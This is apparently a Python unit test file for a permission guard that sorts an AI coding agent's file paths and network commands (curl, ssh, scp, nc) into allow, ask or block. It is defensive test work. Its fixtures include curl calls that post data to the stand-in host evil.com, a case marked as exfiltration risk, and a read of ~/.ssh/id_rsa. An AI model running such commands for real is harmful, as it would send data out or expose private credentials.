"""Unit tests for nah.context — filesystem and network context resolution."""

import os

import pytest

from unittest.mock import patch

from nah import paths
from nah import config
from nah.config import NahConfig
from nah.context import (
    extract_host,
    resolve_context,
    resolve_filesystem_context,
    resolve_network_context,
    reset_known_hosts,
)
import nah.context


# --- resolve_filesystem_context ---


class TestResolveFilesystemContext:
    def test_inside_project(self, project_root):
        # Create a file inside the project root
        target = os.path.join(project_root, "src", "main.py")
        os.makedirs(os.path.dirname(target), exist_ok=True)
        decision, reason = resolve_filesystem_context(target)
        assert decision == "allow"
        assert "inside project" in reason

    def test_outside_project(self, project_root):
        decision, reason = resolve_filesystem_context("/tmp/outside.txt")
        assert decision == "ask"
        assert "outside project" in reason

    def test_no_project_root(self):
        # No project root set, no git repo → auto-detect may or may not find one.
        # Force no project root by setting to None explicitly.
        paths.set_project_root(None)
        # set_project_root(None) sets resolved=True, root=None → no project.
        # Wait — that's what the function does. Let's verify.
        assert paths.get_project_root() is None
        decision, reason = resolve_filesystem_context("/tmp/file.txt")
        assert decision == "ask"
        assert "no git root" in reason

    def test_sensitive_path(self, project_root):
        decision, reason = resolve_filesystem_context("~/.ssh/id_rsa")
        assert decision == "block"
        assert "sensitive path" in reason

    def test_hook_path(self, project_root):
        decision, reason = resolve_filesystem_context("~/.claude/hooks/guard.py")
        assert decision == "ask"
        assert "hook directory" in reason

    def test_empty_path(self, project_root):
        decision, _ = resolve_filesystem_context("")
        assert decision == "allow"

    def test_project_root_itself(self, project_root):
        decision, reason = resolve_filesystem_context(project_root)
        assert decision == "allow"
        assert "inside project" in reason


# --- resolve_network_context ---


class TestResolveNetworkContext:
    def test_localhost(self):
        decision, reason = resolve_network_context(["curl", "http://localhost:3000"])
        assert decision == "allow"
        assert "localhost" in reason

    def test_127_0_0_1(self):
        decision, reason = resolve_network_context(["curl", "http://127.0.0.1:8080"])
        assert decision == "allow"
        assert "localhost" in reason

    def test_ipv6_localhost(self):
        decision, reason = resolve_network_context(["curl", "http://[::1]:8080"])
        # urlparse may or may not handle [::1] well, but we test the intent
        # The extract_host may return "::1" or None depending on parsing
        assert decision in ("allow", "ask")

    def test_known_host_github(self):
        decision, reason = resolve_network_context(["curl", "https://github.com/repo"])
        assert decision == "allow"
        assert "known host" in reason

    def test_known_host_pypi(self):
        decision, reason = resolve_network_context(["curl", "https://pypi.org/simple/"])
        assert decision == "allow"
        assert "known host" in reason

    def test_known_host_npmjs(self):
        decision, reason = resolve_network_context(["curl", "https://registry.npmjs.org/pkg"])
        assert decision == "allow"

    def test_unknown_host(self):
        decision, reason = resolve_network_context(["curl", "https://evil.com/data"])
        assert decision == "ask"
        assert "unknown host" in reason
        assert "evil.com" in reason

    def test_no_host_extracted(self):
        decision, reason = resolve_network_context(["curl"])
        assert decision == "ask"
        assert "unknown host" in reason


# --- extract_host ---


class TestExtractHost:
    def test_curl_url(self):
        assert extract_host(["curl", "https://example.com/path"]) == "example.com"

    def test_curl_bare_host(self):
        assert extract_host(["curl", "example.com"]) == "example.com"

    def test_wget_url(self):
        assert extract_host(["wget", "http://files.example.org/file.tar.gz"]) == "files.example.org"

    def test_ssh_user_at_host(self):
        assert extract_host(["ssh", "user@myserver.com"]) == "myserver.com"

    def test_ssh_with_flags(self):
        assert extract_host(["ssh", "-i", "key.pem", "user@host.com"]) == "host.com"

    def test_scp_user_at_host_path(self):
        assert extract_host(["scp", "user@host.com:file.txt", "."]) == "host.com"

    def test_nc_host(self):
        assert extract_host(["nc", "example.com", "80"]) == "example.com"

    def test_telnet_host(self):
        assert extract_host(["telnet", "example.com"]) == "example.com"

    def test_nc_with_flags(self):
        assert extract_host(["nc", "-w", "5", "example.com", "80"]) == "example.com"

    def test_empty(self):
        assert extract_host([]) is None

    def test_curl_with_flags(self):
        assert extract_host(["curl", "-s", "-o", "/dev/null", "https://api.github.com"]) == "api.github.com"


# --- FD-086: SSH/SCP host extraction ---


class TestExtractHostSSH:
    """FD-086: SSH/SCP/SFTP host extraction — valued flags, IPv6, SCP paths."""

    # IPv6 bracketed addresses
    def test_ssh_ipv6_user_at(self):
        assert extract_host(["ssh", "user@[2001:db8::1]"]) == "2001:db8::1"

    def test_scp_ipv6_user_at_path(self):
        assert extract_host(["scp", "user@[2001:db8::1]:/remote/file", "."]) == "2001:db8::1"

    def test_scp_ipv6_no_user(self):
        assert extract_host(["scp", "[2001:db8::1]:/remote/file", "."]) == "2001:db8::1"

    # SCP local-path-first (should not extract the local path)
    def test_scp_local_path_first_user_at(self):
        assert extract_host(["scp", "/local/file.txt", "user@host.com:/remote/"]) == "host.com"

    def test_scp_local_path_first_colon(self):
        assert extract_host(["scp", "/local/file.txt", "host.com:/remote/"]) == "host.com"

    # Valued flags that were previously missing
    def test_ssh_S_flag(self):
        assert extract_host(["ssh", "-S", "/tmp/socket", "user@host.com"]) == "host.com"

    def test_ssh_D_flag(self):
        assert extract_host(["ssh", "-D", "9999", "user@host.com"]) == "host.com"

    # Bare host (regression guard)
    def test_ssh_bare_host(self):
        assert extract_host(["ssh", "host.com"]) == "host.com"

    # IPv6 localhost
    def test_ssh_ipv6_localhost(self):
        assert extract_host(["ssh", "user@[::1]"]) == "::1"

    # Multiple valued flags in sequence
    def test_ssh_multiple_valued_flags(self):
        assert extract_host(["ssh", "-L", "8080:localhost:80", "-i", "key.pem", "user@host.com"]) == "host.com"

    # ProxyJump (-J consumes jump host, extracts final)
    def test_ssh_proxy_jump(self):
        assert extract_host(["ssh", "-J", "jump.com", "user@final.com"]) == "final.com"

    # -l flag consumes username, bare host is positional
    def test_ssh_l_flag_bare_host(self):
        assert extract_host(["ssh", "-l", "user", "host.com"]) == "host.com"

    # SCP with -r boolean flag (not in valued flags)
    def test_scp_r_flag(self):
        assert extract_host(["scp", "-r", "/dir", "user@host.com:/dest/"]) == "host.com"

    # SCP with -o valued flag
    def test_scp_o_flag(self):
        assert extract_host(["scp", "-o", "StrictHostKeyChecking=no", "/local/file", "root@host.com:/remote/"]) == "host.com"

    # SFTP host extraction
    def test_sftp_user_at_host(self):
        assert extract_host(["sftp", "user@host.com"]) == "host.com"

    def test_sftp_host_colon_path(self):
        assert extract_host(["sftp", "host.com:/path"]) == "host.com"


# --- FD-022: Network write context ---


class TestNetworkWriteContext:
    """FD-022: network_write context resolution."""

    def test_localhost_ask(self):
        """network_write to localhost asks — exfiltration risk (FD-071)."""
        decision, _ = resolve_network_context(
            ["curl", "-d", "{}", "http://localhost:3000"], "network_write"
        )
        assert decision == "ask"

    def test_known_host_ask(self):
        decision, _ = resolve_network_context(
            ["curl", "-X", "POST", "https://github.com"], "network_write"
        )
        assert decision == "ask"

    def test_unknown_host_ask(self):
        decision, _ = resolve_network_context(
            ["curl", "-d", "x", "https://evil.com"], "network_write"
        )
        assert decision == "ask"

    def test_backward_compat_default_param(self):
        """Default action_type preserves old behavior: known hosts → allow."""
        decision, _ = resolve_network_context(["curl", "https://github.com"])
        assert decision == "allow"


# --- FD-022: httpie host extraction ---


class TestExtractHostHttpie:
    """FD-022: httpie host extraction."""

    def test_http_bare_host(self):
        assert extract_host(["http", "example.com"]) == "example.com"

    def test_http_method_host(self):
        assert extract_host(["http", "POST", "example.com"]) == "example.com"

    def test_xh_url(self):
        assert extract_host(["xh", "POST", "https://api.example.com/path"]) == "api.example.com"


# --- FD-055: shared context dispatcher ---


class TestResolveContext:
    """FD-055: resolve_context() dispatches by action type."""

    def teardown_method(self):
        config._cached_config = None

    def test_db_write_with_tool_input(self):
        config._cached_config = NahConfig(db_targets=[{"database": "SANDBOX"}])
        decision, reason = resolve_context(
            "db_write", tool_input={"database": "SANDBOX", "query": "INSERT ..."}
        )
        assert decision == "allow"
        assert "allowed target" in reason

    def test_db_write_with_tokens(self):
        config._cached_config = NahConfig(db_targets=[{"database": "SANDBOX"}])
        decision, reason = resolve_context(
            "db_write", tokens=["psql", "-d", "sandbox"]
        )
        assert decision == "allow"

    def test_db_write_no_input_ask(self):
        config._cached_config = NahConfig(db_targets=[{"database": "SANDBOX"}])
        decision, reason = resolve_context("db_write")
        assert decision == "ask"
        assert "unknown database target" in reason

    def test_network_outbound_with_tokens(self):
        decision, reason = resolve_context(
            "network_outbound", tokens=["curl", "https://github.com/repo"]
        )
        assert decision == "allow"

    def test_network_outbound_no_tokens_ask(self):
        decision, reason = resolve_context("network_outbound")
        assert decision == "ask"
        assert "unknown host" in reason

    def test_network_write_no_tokens_ask(self):
        decision, reason = resolve_context("network_write")
        assert decision == "ask"
        assert "unknown host" in reason

    def test_filesystem_write_with_target(self, project_root):
        target = os.path.join(project_root, "output.txt")
        decision, reason = resolve_context("filesystem_write", target_path=target)
        assert decision == "allow"

    def test_filesystem_write_no_target_ask(self):
        decision, reason = resolve_context("filesystem_write")
        assert decision == "ask"
        assert "no target path" in reason

    def test_filesystem_delete_no_target_ask(self):
        decision, reason = resolve_context("filesystem_delete")
        assert decision == "ask"
        assert "no target path" in reason

    def test_filesystem_read_no_target_allow(self):
        decision, reason = resolve_context("filesystem_read")
        assert decision == "allow"

    def test_unknown_action_type_ask(self):
        decision, reason = resolve_context("unknown")
        assert decision == "ask"
        assert "no context resolver" in reason

    def test_future_action_type_ask(self):
        decision, reason = resolve_context("some_future_type")
        assert decision == "ask"
        assert "no context resolver" in reason


# --- FD-051: Configurable known hosts ---


class TestKnownHostsConfigurable:
    """FD-051: known_registries add/remove/profile-none."""

    def _setup_merge(self, cfg):
        """Reset and allow merge to run with given config."""
        reset_known_hosts()
        nah.context._known_hosts_merged = False
        config._cached_config = cfg

    def teardown_method(self):
        config._cached_config = None
        reset_known_hosts()
        nah.context._known_hosts_merged = True

    def test_add_host_list_form(self):
        self._setup_merge(NahConfig(known_registries=["custom.corp.com"]))
        decision, reason = resolve_network_context(["curl", "https://custom.corp.com/pkg"])
        assert decision == "allow"
        assert "known host" in reason

    def test_add_host_dict_form(self):
        self._setup_merge(NahConfig(known_registries={"add": ["custom.corp.com"]}))
        decision, reason = resolve_network_context(["curl", "https://custom.corp.com/pkg"])
        assert decision == "allow"

    def test_remove_host(self):
        self._setup_merge(NahConfig(known_registries={"remove": ["github.com"]}))
        decision, reason = resolve_network_context(["curl", "https://github.com/repo"])
        assert decision == "ask"
        assert "unknown host" in reason

    def test_add_and_remove_same_host(self):
        """Remove wins over add."""
        self._setup_merge(NahConfig(known_registries={"add": ["x.com"], "remove": ["x.com"]}))
        decision, _ = resolve_network_context(["curl", "https://x.com"])
        assert decision == "ask"

    def test_profile_none_clears_all(self):
        self._setup_merge(NahConfig(profile="none"))
        decision, _ = resolve_network_context(["curl", "https://github.com/repo"])
        assert decision == "ask"

    def test_profile_none_with_add(self):
        """profile: none clears defaults, but user add still works."""
        self._setup_merge(NahConfig(profile="none", known_registries=["custom.io"]))
        decision, _ = resolve_network_context(["curl", "https://custom.io/pkg"])
        assert decision == "allow"
        # Default host should be gone
        decision2, _ = resolve_network_context(["curl", "https://pypi.org/simple/"])
        assert decision2 == "ask"

    def test_list_backward_compat(self):
        """Plain list form works same as before (add-only)."""
        self._setup_merge(NahConfig(known_registries=["internal.corp.com"]))
        # Default hosts still present
        decision, _ = resolve_network_context(["curl", "https://github.com/repo"])
        assert decision == "allow"
        # New host added
        decision2, _ = resolve_network_context(["curl", "https://internal.corp.com/pkg"])
        assert decision2 == "allow"


# --- FD-054: Trusted path in filesystem context ---


class TestTrustedPathContext:
    """FD-054: trusted_paths in resolve_filesystem_context."""

    def setup_method(self):
        config._cached_config = NahConfig()

    def teardown_method(self):
        config._cached_config = None

    def test_trusted_path_allow(self, project_root):
        """Trusted path outside project → allow."""
        config._cached_config = NahConfig(trusted_paths=["/tmp"])
        decision, reason = resolve_filesystem_context("/tmp/file.txt")
        assert decision == "allow"
        assert "trusted path" in reason

    def test_untrusted_path_ask(self, project_root):
        """Non-trusted path outside project → ask."""
        decision, reason = resolve_filesystem_context("/tmp/file.txt")
        assert decision == "ask"
        assert "outside project" in reason

    def test_profile_none_allow(self, project_root):
        """profile: none → allow (guard line)."""
        config._cached_config = NahConfig(profile="none")
        decision, reason = resolve_filesystem_context("/tmp/file.txt")
        assert decision == "allow"
        assert "profile: none" in reason

    def test_trusted_nested(self, project_root):
        """Nested path inside trusted directory → allow."""
        config._cached_config = NahConfig(trusted_paths=["/tmp"])
        decision, reason = resolve_filesystem_context("/tmp/deep/nested.txt")
        assert decision == "allow"
        assert "trusted path" in reason

    def test_trusted_exact_match(self, project_root):
        """Trusted directory itself → allow."""
        config._cached_config = NahConfig(trusted_paths=["/tmp"])
        decision, reason = resolve_filesystem_context("/tmp")
        assert decision == "allow"
        assert "trusted path" in reason

    def test_trusted_path_no_git_root(self):
        """Trusted path should allow even with no git root (FD-107)."""
        paths.set_project_root(None)
        config._cached_config = NahConfig(trusted_paths=["/tmp"])
        decision, reason = resolve_filesystem_context("/tmp/file.txt")
        assert decision == "allow"
        assert "trusted path" in reason
